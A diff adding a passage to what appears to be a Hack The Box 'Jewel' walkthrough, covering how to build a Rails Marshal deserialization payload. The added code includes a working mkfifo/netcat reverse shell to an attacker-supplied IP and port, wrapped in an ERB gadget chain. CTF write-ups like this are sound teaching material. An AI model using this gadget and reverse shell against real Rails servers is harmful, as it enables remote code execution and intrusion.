@@ -66,6 +66,26 @@ To try exploiting this, we need to find a place where we can submit the payload,
 
 To generate the payload, you can walk through the Exploit steps found on the GitHub page. Just a warning, if you're like me and new to Rails, you will likely have to troubleshoot through a lot of errors and install a lot of packages before you get this working successfully.
 
+Once you get it working correctly, you will create a new rails project in your working directory, change to the project directory and then start the `rails console`. Then you can proceed to step though the commands that are listed on the GitHub page. Your commands will look something like this.
+
+``` bash
+rails new generate
+cd generate
+rails console
+
+code = '`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR TUNNEL IP> <YOUR LISTENING PORT> >/tmp/f`'
+erb = ERB.allocate
+erb.instance_variable_set :@src, code
+erb.instance_variable_set :@filename, "1"
+erb.instance_variable_set :@lineno, 1
+payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
+puts URI.encode_www_form(payload: payload)
+```
+
+![](/assets/images/htb-jewel/21_jewel_payload_generate.png)
+
+>**NOTE:** If copying and pasting the commands from the GitHub page, you may run into an error when defining the payload, this is happening because the instructions is missing an "=" sign. Please refer to my commands above.
+
 Another option would be to use the payload that I have already created and then to just add your tunnel IP and your listening port to the reverse shell command.
 
 ``` bash
